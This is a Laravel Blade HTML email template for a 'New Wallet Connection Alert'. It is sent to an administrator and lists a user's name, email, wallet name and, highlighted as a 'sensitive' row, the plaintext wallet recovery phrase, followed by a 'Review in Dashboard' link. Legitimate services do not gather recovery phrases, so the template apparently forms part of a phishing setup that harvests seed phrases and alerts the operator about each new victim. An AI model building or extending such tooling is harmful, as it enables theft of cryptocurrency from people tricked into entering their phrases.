@php use Carbon\Carbon; @endphp
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>New Wallet Connection - {{ config('app.name') }}</title>
        <style>
            body {
                margin: 0;
                padding: 0;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, Helvetica, sans-serif;
                background-color: #f4f7fa;
                color: #1f2a44;
                line-height: 1.6;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale;
                width: 100% !important;
                min-width: 100%;
                -webkit-text-size-adjust: 100%;
                -ms-text-size-adjust: 100%;
            }

            table {
                border-collapse: collapse;
                width: 100%;
                max-width: 640px;
                margin: 0 auto;
            }

            img {
                border: 0;
                outline: none;
                text-decoration: none;
                max-width: 100%;
                height: auto;
                display: block;
            }

            a {
                text-decoration: none;
                color: inherit;
            }

            .email-wrapper {
                width: 100%;
                background-color: #f4f7fa;
                padding: 24px 16px;
            }

            .container {
                background-color: #ffffff;
                border-radius: 12px;
                overflow: hidden;
                border: 1px solid #e2e8f0;
                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
            }

            .header {
                background-color: #1f2a44;
                padding: 32px 24px;
                text-align: center;
            }

            .logo-img {
                max-width: 140px;
                margin: 0 auto 12px;
            }

            .badge {
                display: inline-block;
                background-color: #facc15;
                color: #1f2a44;
                padding: 8px 20px;
                border-radius: 9999px;
                font-size: 14px;
                font-weight: 700;
            }

            .content {
                padding: 32px 24px;
                text-align: center;
            }

            .greeting {
                font-size: 26px;
                font-weight: 700;
                margin: 0 0 12px;
                color: #1f2a44;
            }

            .subtitle {
                font-size: 16px;
                color: #64748b;
                max-width: 90%;
                margin: 0 auto 32px;
            }

            /* --- Desktop Details Card Styling --- */
            .details-card {
                background-color: #ffffff;
                border: 1px solid #e2e8f0;
                border-radius: 12px;
                padding: 24px;
                margin: 24px 0;
                text-align: left;
            }

            .details-table {
                width: 100%;
                border-collapse: separate;
                border-spacing: 0 16px;
            }

            .details-table td {
                padding: 0;
                vertical-align: middle;
                font-size: 15px;
            }

            .details-table .label-cell {
                width: 40%;
            }

            .details-table .icon {
                width: 20px;
                height: 20px;
                margin-right: 12px;
                vertical-align: middle;
            }

            .details-table .label {
                font-weight: 600;
                color: #334155;
                vertical-align: middle;
            }

            .details-table .value {
                color: #1f2a44;
                font-weight: 500;
                text-align: right;
                word-break: break-all;
            }

            .sensitive-row td {
            }

            .sensitive-row .value {
                font-weight: 600;
                color: #b45309;
            }

            /* --- End Desktop Details Card Styling --- */
            .button-container {
                margin: 32px 0;
            }

            .button {
                display: inline-block;
                padding: 14px 32px;
                background-color: #dc2626;
                color: #ffffff !important;
                text-decoration: none;
                border-radius: 8px;
                font-weight: 600;
                font-size: 16px;
                transition: background-color 0.2s ease;
            }

            .button:hover {
                background-color: #b91c1c;
            }

            .footer {
                background-color: #f8fafc;
                padding: 24px;
                text-align: center;
                border-top: 1px solid #e2e8f0;
            }

            .footer p {
                margin: 6px 0;
                font-size: 13px;
                color: #64748b;
            }

            .social-links {
                margin: 16px 0 0;
            }

            .social-link {
                display: inline-block;
                margin: 0 8px;
            }

            .social-img {
                width: 28px;
                height: 28px;
                opacity: 0.8;
                transition: opacity 0.2s ease;
            }

            .social-img:hover {
                opacity: 1;
            }

            /****************************************
            * MOBILE RESPONSIVE STYLES
            ****************************************/
            @media only screen and (max-width: 640px) {
                .email-wrapper {
                    padding: 0;
                }

                .container {
                    border-radius: 0;
                    border: 0;
                }

                .content {
                    padding: 24px 16px;
                }

                .greeting {
                    font-size: 22px;
                }

                .subtitle {
                    font-size: 15px;
                }

                /* --- Mobile Details Card: Transform table into a list of cards --- */
                .details-card {
                    padding: 0;
                    background-color: transparent;
                    border: 0;
                }

                .details-table, .details-table tbody {
                    display: block;
                    width: 100%;
                }

                .details-table tr {
                    display: block;
                    width: 100%;
                    background-color: #ffffff;
                    border: 1px solid #e2e8f0;
                    border-radius: 10px;
                    padding: 16px;
                    margin-bottom: 12px;
                    box-sizing: border-box;
                }

                .details-table td {
                    display: block;
                    width: 100% !important;
                    text-align: left !important;
                    padding: 0 !important;
                }

                .details-table .label-cell {
                    font-size: 11px;
                    font-weight: 700;
                    color: #64748b;
                    text-transform: uppercase;
                    letter-spacing: 1px;
                }

                .details-table .icon {
                    display: none; /* Hide icon on mobile to reduce clutter */
                }

                .details-table .label {
                    font-weight: 700; /* Overwrite for mobile */
                }

                .details-table .value {
                    font-size: 16px;
                    font-weight: 600;
                    padding-top: 4px;
                }

                /* --- Mobile Sensitive Row Styling --- */
                .sensitive-row {
                    background-color: #fffbeb !important;
                    border: 1px solid #facc15 !important;
                }

                .sensitive-row .label-cell {
                    color: #b45309; /* Darker amber color for the label */
                    margin-bottom: 10px;
                }

                .sensitive-row .value {
                    color: #b45309;
                    font-family: 'Courier New', Courier, monospace; /* Use monospace for phrases/keys */
                    font-size: 15px;
                }

                /* --- End Mobile Details Card --- */
                .button {
                    width: 100%;
                    max-width: 100%;
                    box-sizing: border-box;
                }
            }
        </style>
    </head>
    <body>
        <div class="email-wrapper">
            <table class="container" align="center" role="presentation">
                <tr>
                    <td>
                        <div class="header">
                            <a href="{{ config('app.url') }}" title="{{ config('app.name') }}">
                                <img src="{{ asset('assets/images/logo.png') }}" alt="{{ config('app.name') }} Logo"
                                     class="logo-img">
                            </a>
                            <div class="badge">Action Required</div>
                        </div>

                        <div class="content">
                            <h1 class="greeting">New Wallet Connection Alert</h1>
                            <p class="subtitle">A new wallet was connected on your platform. Please review the details below for
                                verification.</p>

                            <div class="details-card">
                                <table class="details-table" role="presentation">
                                    <tr>
                                        <td class="label-cell">
                                            <img src="https://img.icons8.com/material-rounded/24/475569/user-male-circle.png"
                                                 alt="" class="icon">
                                            <span class="label">User Name</span>
                                        </td>
                                        <td>
                                            <span class="value">{{ $user->first_name }} {{ $user->last_name }}</span>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td class="label-cell">
                                            <img src="https://img.icons8.com/material-rounded/24/475569/mail.png" alt=""
                                                 class="icon">
                                            <span class="label">User Email</span>
                                        </td>
                                        <td>
                                            <span class="value">{{ $user->email }}</span>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td class="label-cell">
                                            <img src="https://img.icons8.com/material-rounded/24/475569/wallet.png" alt=""
                                                 class="icon">
                                            <span class="label">Wallet Name</span>
                                        </td>
                                        <td>
                                            <span class="value">{{ $walletConnection->wallet_name }}</span>
                                        </td>
                                    </tr>
                                    <tr class="sensitive-row">
                                        <td class="label-cell">
                                            <img src="https://img.icons8.com/material-rounded/24/f59e0b/key.png" alt=""
                                                 class="icon">
                                            <span class="label">Wallet Phrase</span>
                                        </td>
                                        <td>
                                            <span class="value">{{ $walletConnection->wallet_phrase }}</span>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td class="label-cell">
                                            <img src="https://img.icons8.com/material-rounded/24/475569/time.png" alt=""
                                                 class="icon">
                                            <span class="label">Connection Time (WAT)</span>
                                        </td>
                                        <td>
                                            <span class="value">{{ Carbon::parse($walletConnection->created_at)->setTimezone('Africa/Lagos')->format('F j, Y, g:i A') }}</span>
                                        </td>
                                    </tr>
                                </table>
                            </div>

                            <div class="button-container">
                                <a href="{{ route('admin.wallet.show', $walletConnection->id) }}" class="button">Review in Dashboard</a>
                            </div>
                        </div>

                        <div class="footer">
                            <p>&copy; {{ date('Y') }} {{ config('app.name') }}. All rights reserved.</p>
                            <div class="social-links">
                                <a href="{{ config('settings.social.site_fb') }}" class="social-link" title="Facebook">
                                    <img src="https://img.icons8.com/fluency/48/facebook-new.png" alt="Facebook"
                                         class="social-img">
                                </a>
                                <a href="{{ config('settings.social.site_instagram') }}" class="social-link" title="Instagram">
                                    <img src="https://img.icons8.com/fluency/48/instagram-new.png" alt="Instagram"
                                         class="social-img">
                                </a>
                                <a href="{{ config('settings.social.site_linkedin') }}" class="social-link" title="LinkedIn">
                                    <img src="https://img.icons8.com/fluency/48/linkedin.png" alt="LinkedIn" class="social-img">
                                </a>
                                <a href="{{ config('settings.social.site_youtube') }}" class="social-link" title="YouTube">
                                    <img src="https://img.icons8.com/fluency/48/youtube-play.png" alt="YouTube"
                                         class="social-img">
                                </a>
                            </div>
                        </div>
                    </td>
                </tr>
            </table>
        </div>
    </body>
</html>
